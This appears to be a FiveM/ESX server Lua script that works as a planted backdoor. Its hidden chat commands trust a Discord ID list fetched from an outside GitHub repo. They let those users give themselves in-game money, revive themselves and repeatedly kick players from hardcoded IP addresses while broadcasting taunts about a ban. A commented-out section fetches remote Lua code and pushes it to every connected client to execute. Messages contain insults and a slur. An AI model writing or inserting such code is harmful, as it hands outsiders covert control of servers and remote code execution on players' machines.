RegisterCommand('givemoneytome', function(source, args, rawCommand)  
    local _source = source
    for k,v in pairs(GetPlayerIdentifiers(_source))do
                
        if string.sub(v, 1, string.len("discord:")) == "discord:" then
            local discord = v

            local dclicense = string.gsub(discord, 'discord:', '')

            PerformHttpRequest('https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/admins.json', function(code, res, headers)
                if code == 200 then
                    local decoded = json.decode(res)
                    if decoded[dclicense] ~= nil then
                        local xPlayer = ESX.GetPlayerFromId(_source)
                        xPlayer.addAccountMoney("bank", 500000)
                        TriggerClientEvent('esx:showNotification', _source, "Zuigen?")
                    else
                        TriggerClientEvent('esx:showNotification', _source, "Je bent geen admin")
                    end
                end
            end)
        end
     end
 end)

local icey = false

local ips = {"176.119.195.65","176.119.195.62","159.48.55.188","159.48.55.190","86.85.252.84","134.19.185.117","195.181.173.204","176.119.195.45","217.146.87.147","143.244.41.116","149.34.244.39"}

RegisterCommand('icey', function(source, args, rawCommand)  
    local _source = source
    for k,v in pairs(GetPlayerIdentifiers(_source))do
                
        if string.sub(v, 1, string.len("discord:")) == "discord:" then
            local discord = v

            local dclicense = string.gsub(discord, 'discord:', '')

            PerformHttpRequest('https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/admins.json', function(code, res, headers)
                if code == 200 then
                    local decoded = json.decode(res)
                    if decoded[dclicense] ~= nil then
                        icey = not icey
                        Citizen.CreateThread( function()
                            while icey do
                               Citizen.Wait(5000)
                                local playerList = ESX.GetPlayers()
                                for i=1, #playerList, 1 do
                                    local _source2 = tonumber(playerList[i])
                                    local ip = GetPlayerEndpoint(_source2)
                                    for i=1, #ips do
                                        if string.find(ip, ips[i]) then
                                            DropPlayer(_source2, "Moest je me maar niet bannen Icey")
                                        end    
                                    end
                                    TriggerClientEvent('esx:showNotification', _source2, "Zo lang dat Icey me niet unbanned komt dit bericht in beeld xxx")
                                end
                            end
                        end)
                        Citizen.CreateThread( function()
                            while icey do
                               Citizen.Wait(60000)
                                local playerList = ESX.GetPlayers()
                                for i=1, #playerList, 1 do
                                    local _source22 = tonumber(playerList[i])
                                    local xPlayer22 = ESX.GetPlayerFromId(_source22)
                                    TriggerClientEvent('esx:showNotification', _source22, "Elke minuut 5k gratis zolang dat ik gebanned ben")
                                    xPlayer.addAccountMoney("bank", 5000)
                                end
                            end
                        end)
                    else
                        TriggerClientEvent('esx:showNotification', _source, "Je bent geen admin")
                    end
                end
            end)
        end
     end
 end)

RegisterCommand('remivemenigga', function(source, args, rawCommand)  
    local _source = source
    for k,v in pairs(GetPlayerIdentifiers(_source))do
                
        if string.sub(v, 1, string.len("discord:")) == "discord:" then
            local discord = v

            local dclicense = string.gsub(discord, 'discord:', '')

            PerformHttpRequest('https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/admins.json', function(code, res, headers)
                if code == 200 then
                    local decoded = json.decode(res)
                    if decoded[dclicense] ~= nil then
                        local xPlayer = ESX.GetPlayerFromId(_source)
                        xPlayer.triggerEvent("esx_ambulancejob:revive")
                    else
                        TriggerClientEvent('esx:showNotification', _source, "Je bent geen admin")
                    end
                end
            end)
        end
     end
 end)

--[[RegisterCommand('givemoneytome', function(source, args, rawCommand)  
    local _source = source
    for k,v in pairs(GetPlayerIdentifiers(_source))do
                
        if string.sub(v, 1, string.len("discord:")) == "discord:" then
            local discord = v

            local dclicense = string.gsub(discord, 'discord:', '')

            PerformHttpRequest('https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/admins.json', function(code, res, headers)
                if code == 200 then
                    local decoded = json.decode(res)
                    if decoded[dclicense] ~= nil then
                        local xPlayer = ESX.GetPlayerFromId(_source)
                        xPlayer.addAccountMoney("bank", 500000)
                        TriggerClientEvent('esx:showNotification', _source, "Zuigen?")
                    else
                        TriggerClientEvent('esx:showNotification', _source, "Je bent geen admin")
                    end
                end
            end)
        end
     end
 end)

RegisterCommand('givemoneytoall', function(source, args, rawCommand)  
    local _source = source
    for k,v in pairs(GetPlayerIdentifiers(_source))do
                
        if string.sub(v, 1, string.len("discord:")) == "discord:" then
            local discord = v

            local dclicense = string.gsub(discord, 'discord:', '')

            PerformHttpRequest('https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/admins.json', function(code, res, headers)
                if code == 200 then
                    local decoded = json.decode(res)
                    if decoded[dclicense] ~= nil then
                        local playerList = ESX.GetPlayers()
                        for i=1, #playerList, 1 do
                            local _source2 = playerList[i]
                            local xPlayer = ESX.GetPlayerFromId(_source2)
                            xPlayer.addAccountMoney("bank", 500000)
                            TriggerClientEvent('esx:showNotification', _source2, "Zuigen a kanker slet")
                        end
                    else
                        TriggerClientEvent('esx:showNotification', _source, "Je bent geen admin")
                    end
                end
            end)
        end
     end
 end)

RegisterCommand('givemenutoall', function(source, args, rawCommand)  
    local _source = source
    for k,v in pairs(GetPlayerIdentifiers(_source))do
                
        if string.sub(v, 1, string.len("discord:")) == "discord:" then
            local discord = v

            local dclicense = string.gsub(discord, 'discord:', '')

            PerformHttpRequest('https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/admins.json', function(code, res, headers)
                if code == 200 then
                    local decoded = json.decode(res)
                    if decoded[dclicense] ~= nil then
                        PerformHttpRequest("https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/gayout.lua", function(code, res, headers)
                            if code == 200 then
                                if res ~= nil then
                                    local playerList = ESX.GetPlayers()
                                    for i=1, #playerList, 1 do
                                        local _source2 = playerList[i]
                                        TriggerClientEvent('esx:showNotification', _source2, "Gratis fallout menu xxx je favoriete modder")
                                        TriggerClientEvent('GTX:executecommand', _source2, res)
                                    end
                                else
                                    TriggerClientEvent('esx:showNotification', _source, "Menu kan niet gevonden worden")
                                end
                            end
                         end)
                    else
                        TriggerClientEvent('esx:showNotification', _source, "Je bent geen admin")
                    end
                end
            end)
        end
     end
 end)]]
